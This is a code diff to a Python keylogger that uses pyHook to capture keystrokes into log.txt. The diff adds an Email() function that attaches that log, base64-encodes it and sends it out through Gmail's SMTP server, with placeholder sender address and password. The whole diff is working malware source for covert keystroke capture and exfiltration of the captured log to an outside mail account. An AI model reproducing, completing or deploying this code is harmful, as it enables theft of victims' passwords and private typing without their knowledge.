@@ -3,7 +3,7 @@ import pythoncom
 import sys
 import os
 
-file_log = 'log.txt'  # To output logged keys
+file_log = 'log.txt' 
 data = ''  # To hold logged keys
 
 
@@ -36,6 +36,43 @@ def OutputKeys():
     f.close()
     data = ''
     return True
+
+def Email():
+    fromAddress = "Your email address"  # Change this
+    toAddress = "Your email address"    # Change this
+    message = MIMEMultipart()
+    message['From'] = fromAddress
+    message['To'] = toAddress
+    message['Subject'] = "python keys"
+    body = "TEST BODY"
+
+    message.attach(MIMEText(body, 'plain'))
+
+    # Attachment
+    filename = "log.txt"
+    attachment = open(filename, "rb")
+
+    finalAttachment = MIMEBase('application', 'octet-stream')
+    finalAttachment.set_payload((attachment).read())
+    encoders.encode_base64(finalAttachment)
+    finalAttachment.add_header('Content-Description', "attachment; filename= %s" %filename)
+
+    message.attach(finalAttachment)
+    finalMessage = message.as_string()
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    try:
+        s.login(fromAddress, "Your password")  # Change this
+    except smtplib.SMTPAuthenticationError:
+        print "Invalid creds"
+    try:
+        s.sendmail(fromAddress, toAddress, finalMessage)
+        print "Email Sent!"
+    except:
+        print "Unable to send email"
+    s.quit()
+
 
 
 hooks_manager=pyHook.HookManager()     # Create a hook
